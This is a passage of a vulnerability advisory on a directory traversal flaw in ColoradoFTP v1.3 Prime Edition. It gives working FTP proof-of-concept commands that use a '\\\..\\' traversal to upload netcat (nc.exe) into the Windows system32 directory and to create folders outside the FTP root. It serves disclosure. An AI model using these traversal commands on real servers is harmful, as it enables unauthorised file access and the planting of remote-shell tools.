04. ### Vulnerability Description ###

The default installation and configuration of Colorado FTP Prime Edition
(Build 8) is prone to a
security vulnerability. Colorado FTP contains a flaw that may allow a
remote attacker to traverse directories on the FTP server.
A remote attacker (a colorado FTP user) can send a command (MKDIR, PUT,
GET or DEL) followed by sequences (\\\..\\) to traverse directories
and create, upload, download or delete the contents of arbitrary files
and directories on the FTP server.
To exploit the vulnerability It is important to use "\\\" at the
beginning of string.


05. ### Technical Description / Proof of Concept Code ###

By supplying "\\\..\\..\\..\\..\\" in the file path, it is possible to
trigger a directory traversal flaw, allowing the attacker
(anonymous user or Colorado FTP user) to upload or download a file
outside the virtual directory.


05.01
We tried to upload a file (netcat - nc.exe), to Windows %systemroot%
directory (C:\WINDOWS\system32\) using a PUT command:

ftp> put nc.exe \\\..\\..\\..\\Windows\\system32\\nc.exe

Netcat was successfully uploaded.


05.02
We tried to create a directory (test), using a MKDIR command:

ftp> mkdir nc.exe \\\..\\..\\..\\test

The directory test was successfully created.


06. ### Business Impact ###

This may allow an attacker to upload and download files from remote machine.


07. ### Systems Affected ###

This vulnerability was tested against: ColoradoFTP v1.3 Prime Edition
(Build 8)
O.S.: Microsoft Windows 7 32bit
JDK: v1.7.0_79
Others versions are probably affected too, but they were not checked.


08. ### Vendor Information, Solutions and Workarounds ###
